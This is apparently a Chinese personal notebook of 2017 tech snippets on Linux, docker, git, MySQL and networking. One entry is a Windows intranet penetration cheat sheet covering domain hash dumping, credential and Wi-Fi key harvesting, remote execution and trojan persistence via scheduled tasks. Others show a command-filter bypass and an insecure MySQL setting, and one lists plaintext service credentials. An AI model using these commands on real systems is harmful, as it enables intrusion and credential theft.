先查看docker的虚拟主机IP地址：docker-machine inspect test01，注意：test01是虚拟主机名称，这里查看出来IP地址是：192.168.99.100
打开浏览器访问：http://192.168.99.100即可看到结果
```

### 2017年6月24日

```
Linux命令绕过
|tee 替代 >

ubuntu@VM-72-70-ubuntu:~$ echo${IFS}111|tee${IFS}1.txt
111
ubuntu@VM-72-70-ubuntu:~$ cat 1.txt
111
```

### 2017年6月24日

```
docker ps -a 看没有运行的容器
docker start xxxxxid 运行xxxxxxid容器，并放到后台运行，相当于-d
docker start -ia xxxxxid  运行相当于在后台运行时调到前台来的docker attach xxxxxxid，但是它有一个缺点，只要这个连接终止，或者使用了exit命令，容器就会退出后台运行；

在后台运行的容器，如何进入到这个容器，除了上面说的 docker attach外
还有一种就是exit后不退出后台，docker exec -it xxxxxid bash
这个命令使用exit命令后，不会退出后台，一般使用这个命令。

停止容器，docker stop
```

### 2017年6月18日

```
sort 排序
sort -u
uniq
都是排序并去除重复项

ls -alt按时间查看
```

### 2017年6月15日

```
https://www.cnblogs.com/kaituorensheng/p/3980334.html

linux后台运行和关闭、查看后台任务

fg、bg、jobs、&、nohup、ctrl+z、ctrl+c 命令

一、&

加在一个命令的最后，可以把这个命令放到后台执行，如

watch  -n 10 sh  test.sh  &  #每10s在后台执行一次test.sh脚本
二、ctrl + z

可以将一个正在前台执行的命令放到后台，并且处于暂停状态。

三、jobs

查看当前有多少在后台运行的命令

jobs -l选项可显示所有任务的PID，jobs的状态可以是running, stopped, Terminated。但是如果任务被终止了（kill），shell 从当前的shell环境已知的列表中删除任务的进程标识。

四、fg

将后台中的命令调至前台继续运行。如果后台中有多个命令，可以用fg %jobnumber（是命令编号，不是进程号）将选中的命令调出。

五、bg

将一个在后台暂停的命令，变成在后台继续执行。如果后台中有多个命令，可以用bg %jobnumber将选中的命令调出。

六、kill

法子1：通过jobs命令查看job号（假设为num），然后执行kill %num
法子2：通过ps命令查看job的进程号（PID，假设为pid），然后执行kill pid
前台进程的终止：Ctrl+c
```

### 2017年6月12日

```
http://www.360doc.com/content/15/0429/22/2006953_466924662.shtml

G、E、O、3G、H、H+、4G是什么含义

G 指GPRS，是2.5G网络（iPhone上会显示O）
E 指EDGE网络，属2.75G.
3G 指普通3G网络，速度在2-7M.
H 指3G的升级版hsdpa网络，是3.5G，速度可达14.4M.
H+ 是hsdpa的升级版hspa+，是3.75G，速度可达21M-42M.
4G 技术支持100Mbps~150Mbps的下行网络带宽。      

4G意味着用户可以体验到最大12.5MB/s~18.75MB/s的下行速度
网络速度从慢到快依次是G<E<3G<H<H+。

100Mbps换成我们易于理解的形式就是12.5MB/s，也就是说中国移动宣传中所使用的“网速可达每秒百兆”真实含义是12.5MB/s。

100Mbps换成我们易于理解的形式就是12.5MB/s，也就是说中国移动宣传中所使用的“网速可达每秒百兆”真实含义是12.5MB/s。

TDD-LTE，这种4G制式下，信号数据的上传和下载都在同一个频率的信道中进行。为了能让上传和下载的数据不发生“打架”，两部分数据之间采用一定的保证时间予以分离。
FDD-LTE，这种4G制式下，信号数据的传输有两个独立的信道，这两个信道的频率不同，一个用来上传数据，另一个用来下载数据。这样上传和下载的数据可以在各自的信息通道中进行自由传输，而不用担心产生相互干扰。
```

### 2017年6月5日

git checkout、reset区别

```
git checkout主要有三个作用：
第一个就是切换分支。例如你从远程仓库clone下来所有的源代码，你git branch一下会看到你通常是在master，如果你想切换到某一个分支上呢？git checkout <branchname>
第二个就是放弃对某个文件的修改。例如你想放弃对某个文件Hello.cpp的修改，git checkout -- <Hello.cpp>
第三个就是新建一个分支，git checkout <-b> <branchname>，不加-b的话只新建不切换到新的分支上，加-b新建并切换到该分支上；和git branch 来建立一样；

git reset主要是取消上一次的操作，具体用法有很多，说两个：
第一个取消merge，git reset --hard ORIG_HEAD，这样会退回到merge前的代码。
第二个就是取消commit，git reset HEAD~<num> <-soft/-hard>，取消上num次的commit
第三个是将文件从stage（追踪的库）中移除，git reset HEAD <filename>
```

### 2017年6月3日

```
ANS匿名系统
67.229.98.5
dlt004 
1qaz2wsx..

ANS匿名上网系统（Anonymous Net System）
“隐匿网络身份，防止网络追踪”
通过使用 ANS 匿名上网系统接入互联网，经过若干个中继服务器，隐藏真实出口，防止使用者真实 IP 地址、物理地址等敏感信息被追踪，降低安全风险。
```

### 2017年5月16日

```
如时您进入/dev目录，列一下文件，会看到类似如下的；
[root@localhost ~]# ls -la /dev/ttycrw-rw-rw- 1 root tty 5, 0 04-19 08:29 /dev/tty[root@localhost ~]# ls -la /dev/hda1brw-r----- 1 root disk 3, 1 2006-04-19 /dev/hda1
我们看到/dev/tty的属性是 crw-rw-rw- ，注意前面第一个字符是 c ，这表示字符设备文件。比如猫等串口设备
我们看到 /dev/hda1 的属性是 brw-r----- ，注意前面的第一个字符是b，这表示块设备，比如硬盘，光驱等设备；
这个种类的文件，是用mknode来创建，用rm来删除。目前在最新的Linux发行版本中，我们一般不用自己来创建设备文件。因为这些文件是和内核相关联的。
```

### 2017年5月16日

```
定义自己的变量 
变量名=变量值 或 ${变量名=变量值}
在定义变量时，变量名前不应加符号“$”，在引用变量的内容时则应在变量名前加“$”；在给变量赋值时，等号两边一定不能留空格，若变量中本身就包含了空格，则整个字符串都要用双引号括起来。 
说明一个变量为只读     　
readonly  变量名   　
变量默认都只是当前shell的局部变量，将变量成为公共变量的格式为：   
export 变量名 
也可以在给变量赋值的同时使用export命令：export 变量名=变量值 
使用export说明的变量，在shell以后运行的所有命令或程序中都可以访问到

注意： myvar=test*
      echo $myvar
	  echo "$myvar"
```

### 2017年5月17日

```
假设你发现前台运行的一个程序需要很长的时间，但是需要干其他的事情，就可以利用后台技术；

Shell支持作用控制，有以下命令实现前后台切换：
　　1. command& 让进程在后台运行
　　2. jobs 查看后台运行的进程
　　3. fg %n 让后台运行的进程n到前台来
　　4. bg %n 让进程n到后台去
      5. kill %n 杀死job
　　PS:"n"为jobs命令查看到的job编号，不是进程编号.
　　fg、bg、jobs、&、ctrl + z都是跟系统任务有关的，虽然现在基本上不怎么需要用到这些命令，但学会了也是很实用的.
 
命令执行直接进入后台：
在命名最后加 & ，可以把这个命令放到后台执行

Q：再打开个终端不就可以执行了么？
A：实际Linux你给我找个桌面版....
```

### 2017年7月21日

shell变量Tips

```
拼接字符串
your_name="qinjx"
greeting="hello, "$your_name" !"
greeting_1="hello, ${your_name} !"
echo $greeting $greeting_1

获取字符串长度
string="abcd"
echo ${#string} #输出 4

提取子字符串
以下实例从字符串第 2 个字符开始截取 4 个字符：
string="runoob is a great site"
echo ${string:1:4} # 输出 unoo

root@L4oZu1:~/Desktop# cat 1.sh 
#!/bin/bash

your_name="qinjx"
greeting="hello, "$your_name" !"
greeting_1="hello, ${your_name} !"
echo $greeting $greeting_1

string="abcd"
echo ${#string} #输出 4

string="runoob is a great site"
echo ${string:1:4} # 输出 unoo

root@L4oZu1:~/Desktop# ./1.sh 
hello, qinjx ! hello, qinjx !
4
unoo

Linux 的字符串截取很有用。有八种方法。
假设有变量 var=http://www.aaa.com/123.htm
1. # 号截取，删除左边字符，保留右边字符。
echo ${var#*//}
其中 var 是变量名，# 号是运算符，*// 表示从左边开始删除第一个 // 号及左边的所有字符
即删除 http://
结果是 ：www.aaa.com/123.htm
2. ## 号截取，删除左边字符，保留右边字符。
echo ${var##*/}
##*/ 表示从左边开始删除最后（最右边）一个 / 号及左边的所有字符
即删除 http://www.aaa.com/
结果是 123.htm
3. %号截取，删除右边字符，保留左边字符
echo ${var%/*}
%/* 表示从右边开始，删除第一个 / 号及右边的字符
结果是：http://www.aaa.com
4. %% 号截取，删除右边字符，保留左边字符
echo ${var%%/*}
%%/* 表示从右边开始，删除最后（最左边）一个 / 号及右边的字符
结果是：http:
5. 从左边第几个字符开始，及字符的个数
echo ${var:0:5}
其中的 0 表示左边第一个字符开始，5 表示字符的总个数。
结果是：http:
6. 从左边第几个字符开始，一直到结束。
echo ${var:7}
其中的 7 表示左边第8个字符开始，一直到结束。
结果是 ：www.aaa.com/123.htm
7. 从右边第几个字符开始，及字符的个数
echo ${var:0-7:3}
其中的 0-7 表示右边算起第七个字符开始，3 表示字符的个数。
结果是：123
8. 从右边第几个字符开始，一直到结束。
echo ${var:0-7}
表示从右边第七个字符开始，一直到结束。
结果是：123.htm
注：（左边的第一个字符是用 0 表示，右边的第一个字符用 0-1 表示）
```

### 2017年5月16日

linux查看和修改PATH环境变量的方法

```
查看PATH：echo $PATH
以添加mongodb server为列
修改方法一：
export PATH=/usr/local/mongodb/bin:$PATH
//配置完后可以通过echo $PATH查看配置结果。
生效方法：立即生效
有效期限：临时改变，只能在当前的终端窗口中有效，当前窗口关闭后就会恢复原有的path配置
用户局限：仅对当前用户

修改方法二：
通过修改.bashrc文件:
vim ~/.bashrc 
//在最后一行添上：
export PATH=/usr/local/mongodb/bin:$PATH
生效方法：（有以下两种）
1、关闭当前终端窗口，重新打开一个新终端窗口就能生效
2、输入“source ~/.bashrc”命令，立即生效
有效期限：永久有效
用户局限：仅对当前用户

修改方法三:
通过修改profile文件:
vim /etc/profile
/export PATH //找到设置PATH的行，添加
export PATH=/usr/local/mongodb/bin:$PATH
生效方法：系统重启
有效期限：永久有效
用户局限：对所有用户

修改方法四:
通过修改environment文件:
vim /etc/environment
在PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"中加入“:/usr/local/mongodb/bin”
生效方法：系统重启
有效期限：永久有效
用户局限：对所有用户
```

### 2017年5月16日

```
A.使用&&
       command1 && command2
	这种命令执行方式相当地直接。&&左边的命令（command1）返回真(即返回0，成功被执行）后，&&右边的命令（command2）才能够被执行；
	
B.使用||
       command1 || command2
       ||的作用有一些不同。如果||左边的命令（command1）未执行成功，那么就执行||右边的命令（command2）；或者换句话说，“如果这个命令执行失败了|| 那么就执行这个命令”
       
C. command1 && command2 && command3 
        当command1, command2成功时才执行command3 
        
D. command1 && command2 || comamnd3 
        仅当command1成功，command2失败时才执行command3 

command1&command2&command3  三个命令同时执行command1;command2;command3     不管前面命令执行成功没有，后面的命令继续执行 
```

### 2017年5月16日

```
root@L4oZu1:~/Desktop# a='hello';echo $a
hello
root@L4oZu1:~/Desktop# a='hello';echo '$a'
$a
root@L4oZu1:~/Desktop# a='hello';echo "$a"
hello
root@L4oZu1:~/Desktop# a='hello';echo \$a
$a

单引号''---将消除被括在单引号中的所有特殊字符的含义
双引号""---将消除除$（用于变量替换）、`（用于命令替换）、\$，\`，\"，\\（可以出现转义字符）之外符号的特殊含义
&*+^$`"|?[];<>在shell中都具有特殊含义
```

### 2017年5月16日

```
自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。

除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。

而.user.ini针对nginx等其他web server也是有效的,是一种更通用的解法。

实例：http://www.math1as.com/index.php/archives/468/
```

### 2017年5月15日

```
C类局域网专用网段：192.168.0.1~192.168.255.254    很多公司网吧都是用这个网段 hoho

B类局域网专用网段：172.16.0.1~172.31.255.254

A类局域网专用网段：10.0.0.1~10.255.255.254

几个特殊的IP地址：127.0.0.1为本地回路测试地址

255.255.255.255代表广播地址

0.0.0.0代表任何网络

网络号全为0的代表本地网络和本地网段

网络号全为1的代表所有的网络

主机位全为0的代表某个网段的任何主机地址

主机位全为1的代表该网段的所有主机
```

### 2017年5月10日

```
文件名通配符：
* 匹配多个字符
? 匹配一个字符
[0-9] 包含字符，匹配一个
例如：
grep "string" index* -in 匹配当前目录下所有以index开头的文件里的string字符串，忽略大小写，输出行数；
grep "string" in?ex* 等等
grep "" -r 循环遍历文件夹，比find+xargs grep方便多了；
```

### 2017年5月9日

```
SSCTF抽奖代码review

#coding=utf-8
import json
import random

rank = json.load(open('rank.json'))['RECORDS']

# 一等奖2名（第4-15名里抽取），¥500元现金或等值奖品。
rank1 = rank[3:15]
random.shuffle(rank1)
rank1 = rank1[:2]

# 二等奖5名（第16-50名里抽取），¥200元现金或等值奖品。
rank2 = rank[15:50]
random.shuffle(rank2)
rank2 = rank2[:5]

# 三等奖10名（第51-100名里抽取），¥100元现金或等值奖品。
rank3 = rank[50:100]
random.shuffle(rank3)
rank3 = rank3[:10]

print "\n\n\n\n"

print '-'*10+'一等奖'+'-'*10
for x in rank1:
    print x['team_name'],x['team_score'],x['final_time']

print '-'*10+'二等奖'+'-'*10
for x in rank2:
    print x['team_name'],x['team_score'],x['final_time']

print '-'*10+'三等奖'+'-'*10
for x in rank3:
    print x['team_name'],x['team_score'],x['final_time']

json代码
{
"RECORDS":[
{
"team_name":"FlappyPig",
"team_score":3550,
"final_time":"2017\/5\/7 17:39:05"
},
{
"team_name":"FFF",
"team_score":3350,
"final_time":"2017\/5\/7 20:49:27"
},
。。。
```

### 2017年7月21日

```
目录的读权限仅允许我们读目录，获得在该目录中所有文件名的列表，但无法查看目录中文件的内容。

目录的执行权限不允许我们读取目录的文件列表，但可以查看目录中文件的内容。当一个目录是我们要访问文件的路径名的一个组成部分时，对该目录的执行权限使我们可通过该目录。

熟悉linux权限的同学应该知道，一个文件是否允许被删除，是要看其所在目录的权限。如果我对他所在的目录有写权限，我就可以将其删掉，即使这个文件不属于我。所以，通过后台的删除功能，搅屎棍可以将网站静态文件“删光光”，直接影响后面的选手做题体验。

这种情况怎么办？Linux下的文件有一些“隐藏属性”，我们可以通过lsattr来查看，chattr来修改：

如上图，这是我配置的js目录文件的隐藏权限。

我将所有已存在的js文件全部加上了i标志（chattr +i *），i的意思就是，不允许对文件进行任何修改（包括删除）。

这时候我们可以试试rm，root用户也没法删除flag文件了。

除此之外，如果当前用户在母文件夹没有x执行权限，是不能进入该目录的；
执行权限，表示拥护可以执行文件，对于目录文件，表示用户可以进入该目录；

Linux下所有东西即文件，普通文件rwx对应读写执行，目录文件对应可读取，可创建可删除，可进入；

su 改变用户；
sudo 使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中（通常是/etc/sudoers），即完成对该用户的授权（此时该用户称为“sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在/etc/sudoers自定义），使用sudo不需要再次输入密码。由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如Ubuntu、Mac OS X等。
```

### 2017年5月7日

```
MYSQL  \G 用法：查询结果按列打印

\G 放到sql语句后,可以使每个字段打印到单独的行，如：
mysql> select * from user_msg limit 2 \G;
*************************** 1. row ***************************
         uid: 1
   today_msg: 0
  today_recv: 1
recvmsgcount: 59
sendmsgcount: 0
     twoday1: 0
    treeday1: 0
     towday2: 0
    treeday2: 0
   todayfist: 0
*************************** 2. row ***************************
         uid: 2
   today_msg: 0
  today_recv: 1
recvmsgcount: 292
sendmsgcount: 2693
     twoday1: 0
    treeday1: 0
     towday2: 0
    treeday2: 0
   todayfist: 0
2 rows in set (0.02 sec)
```

### 2017年5月7日

```
每次用camder手动一层一层的进入目标文件夹，是一件很麻烦的事儿。所以，将camder添加到系统右键菜单是个很好地解决方法。

1、把 Cmder 加到环境变量 
把Cmder.exe存放的目录添加到系统环境变量； 
加完之后,Win+r一下输入cmder,即可。

2、添加 cmder 到右键菜单：环境变量添加后，在任意文件夹中即可打开Cmder，上一步的把 Cmder 加到环境变量就是为此服务的, 在管理员权限的终端输入以下语句即可: 
Cmder.exe /REGISTER ALL

3、为Cmder.exe创建快捷方式，右击Cmder.exe选择“创建快捷方式”点击即可，以后打开Cmder.exe只要点击桌面对应的快捷方式即可
```

### 2017年5月5日

```
1.域常用操作命令：
net group /domain	//获得所有域用户组列表
net group qq_group /domain	//显示域中qq_group组的成员
net group qq_group /del /domain	//删除域中qq_group组
net group qq_group qq /del /domain	//删除域内qq_group 群组中的成员QQ
net group qq_group /add /domain	//增加域中的群组
net group "domain admins" /domain	//获得域管理员列表
net group "enterprise admins" /domain	//获得企业管理员列表
net localgroup administrators /domain	//获取域内置administrators组用（enterprise admins、domain admins）
net group "domain controllers" /domain	//获得域控制器列表
net group "domain computers" /domain	//获得所有域成员计算机列表
net user /domain	//获得所有域用户列表
net user someuser /domain	//获得指定账户someuser的详细信息
net accounts /domain	//获得域密码策略设置，密码长短，错误锁定等信息
nei view /domain	//查询有几个域, 查询域列表
net view /domain:testdomain	//查看 testdomain域中的计算机列表
nltest /domain_trusts	//获取域信任信息
net user domain-admin /domain	//查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息
net config Workstation	//查询机器属于哪个域
net time /domian	//查询主域服务器的时间
echo %logonserver%	//查看登陆到这台服务器的计算机名
net time  \\192.168.1.1	//查询远程共享主机192.168.1.1的时间
net use \\IP\ipc$ password /user:username@domain	//ipc$域内连接
net  view  \\dc2.backlion.com	//查看域控共享情况
dir \\dc2.backlion.com\SYSVOL /s /a > sysvol.txt	//列出sysvol日志记录
xcopy \\dc2.backlion.com\sysvol.txt sysvol.txt  /i  /e  /c	//远程拷贝到本地sysvol日志
net user  /domain  bk bk123	//修改域内用户密码，需要管理员权限
net  localgroup  administartors   SEZKL\backlion  /add	//将SEZKL域中的用户backlion添加到administrators组中
mstsc /admin	//远程桌面登录到console会话解决hash无法抓出问题
gpupdate/force	//更新域策略
psexec \\192.168.1.3 -u administrator -p bk1234 -c gsecdump.exe -u	//从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来
gsecdump  -a	//获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值
tasklist /S ip /U domain\username /P /V	//查看远程计算机进程列

2.基本内网渗透命令：
ipconfig/all	//查看IP地址
ipconfig /release	//释放地址
ipconfig /renew	重新获取Ip地址
whoami	//查询账号所属权限
whoami/all	//查看sid值
systeminfo	//查询系统以及补丁信息
tasklist /svc	//查看进程
taskkill /im 进程名称(cmd)	//结束进程
taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)
wmic qfe  get hotfixid	//查看已安装过得补丁，这个很实用
wmic qfe list full /format:htable > hotfixes.htm	//详细的补丁安装
wmic  qfe	//查询补丁信息以及微软提供的下载地址
ping hostname(主机名）	//显示该机器名的IP
net start	//查看当前运行的服务
net user	//查看本地组的用户
net localhroup administrators	//查看本机管理员组有哪些用户
net user	//查看会话
net session	//查看当前会话
net share	//查看SMB指向的路径[即共享]
wmic share get name,path	//查看SMB指向的路径
wmic nteventlog get path,filename,writeable	//查询系统日志文件存储位置
net use \\IP\ipc$  password  /user:username	//建立IPC会话（工作组模式）
net use  z:  \\192.168.1.1	//建立映射到本机Z盘
net time \\172.16.16.2	//查询共享主机的是
at \\172.16.16.2 13:50 c:\windows\2009.exe	//在共享主机上执行
netstat  -ano	//查看开放的端口
netstat -an | find “3389”	//找到3389端口
net accounts	//查看本地密码策略
nbtstat –A ip	//netbiso查询
net view	//查看机器注释或许能得到当前活动状态的机器列表，如果
禁用netbios就查看不出来
echo %PROCESSOR_ARCHITECTURE%	//查看系统是32还是64位 
set	//查看系统环境设置变量
net start	//查看当前运行的服务
wmic service list brief	//查看进程服务
wmic process list brief	//查看进程
wmic startup list brief	//查看启动程序信息
wmic product list brief	//查看安装程序和版本信息（漏洞利用线索）
wmic startup list full	//识别开机启动的程序
wmic process where(description="mysqld.exe")
 >>mysql.log	//获取软件安装路径
for /f "skip=9 tokens=1,2 delims=:" %i in ('ne
tsh wlan showprofiles') do @echo %j | findstr 
-i -v echo | netsh wlan show profiles %jkey=clear	//一键获取wifi密码
if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell)	//查看是否支持posershell
qwinsta	//查看登录情况
schtasks.exe  /Create /RU"SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "c:/muma.ex    e" /ED 2017/4/7	//添加计划任务
set KB2829361=MS13-046&set KB2830290=MS13-046&setKB2667440=MS12-020&set KB2667402=MS12-020&set KB3124280=MS16-016&setKB3077657=MS15-077&set KB3045171=MS15-051&setKB2592799=MS11-080&set KB952004=MS09-012 PR&set KB956572=MS09-012 巴西烤肉&set KB970483=MS09-020 iis6&set KB2124261=MS10-065 ii7&setKB2271195=MS10-065 ii7&systeminfo>a.txt&(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i "%i"||@echo %%i% Not Installed!)&del /f/q /a a.txt	//windows未打补丁情况
REG query HKCU  /v "pwd" /s	//获取保存到注册表中的密码

3.内网网络结常用命令：
tracert IP	//路由跟踪
route print	//打印路由表
arp -a	//列出本网段内所有活跃的IP地址
arp -s （ip + mac）	//绑定mac与ip地址
arp -d （ip + mac）	//解绑mac与ip地址
nbtscan -r 192.168.16.0/24	//通过小工具nbtscan扫描整个网络
netsh firewall show config	//查看防火墙策略
netsh firewall show state	//查看防火墙策略
for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i"ttl"	//批量扫描内网存活主机

windows自带端口转发：
netsh interface ipv6 install	//首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22connectaddress=1.1.1.1 connectport=22	//将本机22到1.1.1.1的22
netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=8.8.8.8 connectport=22	
netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=www.baidu.com connectport=22	
netsh interface portproxy show all	// 查看转发配置
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0listenport=22	//删除配置
netsh firewall set portopening protocol=tcp port=22 name=Forwardmode=enable scope=all profile=all	//添加防火墙规则，允许连接22：

4.敏感数据和目录：
dir /b/s config.*	//查看所在目录所有config.为前缀的文件
findstr /si password *.xml *.ini *.txt	//查看后缀名文件中含有password关键字的文件
findstr /si login *.xml *.ini *.txt	//查看后缀名文件中含有login关键字的文件
copy con 创建命令：	
copy con  ftp.bat	//创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功
copy con  test.vbs	//创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功

5.dsquery的AD查询工具：
dsquery user domainroot -limit 65535 && net user /domain	//列出该域内所有用户名
dsquery server -domain super.com | dsget server -dnsname -site	//搜索域内所有域控制器并显示他们的DNS主机名和站点名称
dsquery contact	//寻找目录中的联系人
dsquery subnet	//列出该域内网段划分
query user	//查询那些用户在线
dsquery group && net group /domain	//列出该域内分组
dsquery ou	//列出该域内组织单位
dsquery server && net time /domain	//列出该域内域控制器
dsquery site -o rdn	//搜索域中所有站点的名称
dsquery group dc=super,dc=com |more	//搜索在DC=SUPER,DC=COM 域中的所有组
psloggedon.exe	//查询那台主机和用户登录到该主机上
netsess.exe   //192.168.1.115	//远程主机上无需管理员权限,查询到主机名和用户
reg query "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT"	//获取最近mstsc登录的记录

6.DOS常用快捷命令
mspaint	画图工具
calc	计算器
notepad	记事本
taskmgr	任务管理器
osk	打开屏幕键盘
gpedit.msc	组策略
services.msc	本地服务
compmgmt.msc	计算机管理
devmgmt.msc	设备管理器
winver	查看系统版本
magnify	放大镜实用程序
eventvwr	事件查看器
Regedit	打开注册表
resmon	资源监视器
WMIC BIOS get releasedate	查看电脑生产日期
mstsc -f	远程连接（可以全屏）
```

### 2017年4月26日

```
Linux Ctrl+Alt+Shift+F1-6 命令行界面，即可以同时打开多个终端。
F7 图形界面。

在命令行界面下，使用Shift+PageUp/PageDown 来上下移动界面。
```

### 2017年4月24日

```
什么是代理服务器?
代理服务器是介于浏览器和Web服务器之间的一台服务器,当你通过代理服务器上网浏览时,浏览器不是直接到Web服务器去取回网页,而是向代理服务器发出请求,由代理服务器来取回浏览器所需要的信息,并传送给你的浏览器.
使用代理服务器的好处 
Proxy Server(代理服务器)是Internet链路级网关所提供的一种重要的安全功能,它的工作主要在开放系统互联(OSI)型的对话层,主要的功能是突破自身IP访问限制：
1.访问国外站点.教育网、169网等网络用户可以通过代理访问国外网站.
2.访问一些单位或团体内部资源,如某大学FTP(前提是该代理地址在该资源 
的允许访问范围之内),使用教育网内地址段免费代理服务器,就可以用于对教育 
网开放的各类FTP下载上传,以及各类资料查询共享等服务.
3.突破中国电信的IP封锁：中国电信用户有很多网站是被限制访问的,这种 
限制是人为的,不同Serve对地址的封锁是不同的.所以不能访问时可以换一个国外的代理服务器试试.
4.提高访问速度：通常代理服务器都设置一个较大的硬盘缓冲区,当有外界 
的信息通过时,同时也将其保存到缓冲区中,当其他用户再访问相同的信息时,
则直接由缓冲区中取出信息,传给用户,以提高访问速度.
5.隐藏真实IP：上网者也可以通过这种方法隐藏自己的IP,免受攻击.

socks和http的区别：
SOCKS是一组由Internal工程工作小组（IETF）所开发出来的开放软件开放标准,用来处理网络安全的事宜.SOCKS象一堵墙被夹在Internal服务器和客户端之间,对于出入企业网络的资讯提供流量和安全的管理.SOCKS这个名词并不是一组英文字头的缩写,而是一个和TCP/IP的Socket端口有关的安全标准,一般防火墙系统通常是象网关（Gateway）一样是作用在OSI模型的第七层也就是应用层上,对TCP/IP的高级协议,如Telnet、FTP、HTTP和SMTP加以管制,而SOCKS作用在OSI模型的第四层也就是会话层上,象一个代理一样对客户端到服务器端或服务器和服务器之间的数据联系,提供安全上的服务.由于SOCKS作用在会话层上,因此它是一个提供会话层到会话层间安全服务的方案,不受高层应用程序变更的影响.Socks代理只是简单地传递数据包,而不必关心是何种应用协议(比如FTP、HTTP和NNTP请求),所以Socks代理服务器比应用层代理服务器要快的。
```

### 

Windows下自带编码命令certutil

```
echo 48 65 6C 6C 6F 2C 57 6F 72 6C 64 21 >hex.txt
::生成 hex.txt，机器码对应的内容是 Hallo World!

certutil -decodehex hex.txt bin.txt
::Hex2Bin

certutil -encode bin.txt Encode.txt
::Base64_Encode

certutil -decode Encode.txt Decode.txt
::Base64_Decode
```

![certutil.png](./src/certutil.png)

### 2017年4月24日

```
web机器开放80端口，绑定nat网卡，80端口映射出来。
pc机器绑定一个仅主机类型网卡1，ip设置为192.168.5.13，然后web机器同样再添加一块网卡，也绑定到仅主机网卡1上去，设置ip为192.168.5.11。
AD机器绑定一块新网卡，仅主机类型网卡2，ip设置为192.168.2.11，然后pc机器同样添加一块新网卡，同样绑定到仅主机网卡2上去，设置192.168.2.3。

然后web和pc机器属于同一内网，pc和ad属于同一内网。

仅主机就是和你真实电脑没关联的一块网卡，nat是把你的电脑当路由器，向虚拟机分配网络资源，桥接就是给虚拟机模拟真实的网卡，和你真实电脑享受同样的网络资源待遇。
```

### 2017年4月14日

```
Mysql limit offset示例

例1，假设数据库表student存在13条数据。
代码示例:
语句1：select * from student limit 9,4
语句2：slect * from student limit 4 offset 9
// 语句1和2均返回表student的第10、11、12、13行  
//语句2中的4表示返回4行，9表示从表的第十行开始
```

### 2017年4月13日

```
select 姓名,年龄 from [表$] order by 1 desc；
这里的1就代表姓名的意思，因为在列出的字段时，它作第1列；
同理，如果写作2的话，就是以年龄为条件进行排序，7的话就是以列出的第7个字段来排序。
这就说明如果字段超了，order by 会报错。
desc代表逆向排序。
```

### 2017年4月13日

```
secure_file_priv  mysqld 用这个配置项来完成对数据导入导出的限制

例如我们可以通过 select * from tempdb.t into outfile '/home/mysql/t.txt'; 把tempdb.t 表的数据导出来；这个导出操作可以面临如下问题：
1、任何一个mysql用户只要它能执行上面的sql语句、并且执行成功；那么它就把文件写到了/home/mysql/目录下？
     如果有一个坏人他一直导出数据到文件目录，那么总有一天会被写满的！
2、没有办法限制只能把文件导出到/tmp/目录。
我们可以通过secure_file_priv 来完成对导入|导出的限制：
secure_file_priv 
　　1、限制mysqld 不允许导入 | 导出
　　　  mysqld --secure_file_prive=null
　　2、限制mysqld 的导入 | 导出 只能发生在/tmp/目录下
　　　  mysqld --secure_file_priv=/tmp/

如果想任意上传，直接在my.ini或者mysql.cnf里把这个变量注释掉，再重启服务。
```

### 2017年4月11日

```
反码表示法规定：正数的反码与其原码相同；负数的反码是对其原码逐位取反,但符号位除外。
补码表示法规定：正数的补码与其原码相同；负数的补码是在其反码的末位加1。
```

### 2017年4月10日

```
ubuntu 16.04默认用户ubuntu
ubuntu用户属于其他用户，和root并不是一组，但是在sudoers文件中标记了且不需要密码，即系统命令需要在之前添加sudo来增加权限

新建文件夹默认权限755
新建文件644

进入某目录使用的是执行x权限，而不是读r权限，即目录控制碰到upload等上传目录时，母目录给执行权限，子目录给写权限

防止在upload目录执行php等脚本，可以在apache2.conf选择禁止，见博客
```

### 2017年4月8日

```
在Linux下运行shell脚本，报错：
stop.sh: line 12: syntax error: unexpected end of file

使用vim打开脚本，执行命令：
set fileformat=unix
保存退出就可以了。问题解决。

原因是Linux下的文件结束符和Windows下的文件结束符不一样。在Windows上编辑的脚本，放在Linux额上运行就会有这种问题。
```

### 2017年4月8日

```
配置文件：/etc/crontab
修改完重启机子生效；

# m h dom mon dow user  command
#第1列表示分钟1～59 每分钟用*或者 */1表示
#第2列表示小时1～23（0表示0点）
#第3列表示日期1～31
#第4列表示月份1～12
#第5列标识号星期0～6（0表示星期天）
#第6列以什么身份运行
